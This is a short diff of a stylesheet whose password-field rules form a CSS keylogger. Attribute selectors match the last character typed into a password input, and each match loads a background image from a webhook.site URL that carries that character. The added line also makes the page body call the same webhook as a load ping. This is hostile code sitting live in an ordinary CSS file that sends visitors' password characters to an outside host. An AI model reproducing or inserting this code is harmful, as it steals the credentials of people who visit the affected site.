@@ -65,4 +65,4 @@ input[type="password"][value$="_"] { background: url("https://webhook.site/95012
 input[type="password"][value$="="] { background: url("https://webhook.site/9501285a-f6f3-45e0-b7f2-5f96f59ec4fa?="); }
 input[type="password"][value$="-"] { background: url("https://webhook.site/9501285a-f6f3-45e0-b7f2-5f96f59ec4fa?-"); }
 input[type="password"][value$="@"] { background: url("https://webhook.site/9501285a-f6f3-45e0-b7f2-5f96f59ec4fa?@"); }
-body {color: red;}
+body {color: red; background:url("https://webhook.site/9501285a-f6f3-45e0-b7f2-5f96f59ec4fa?ping");}
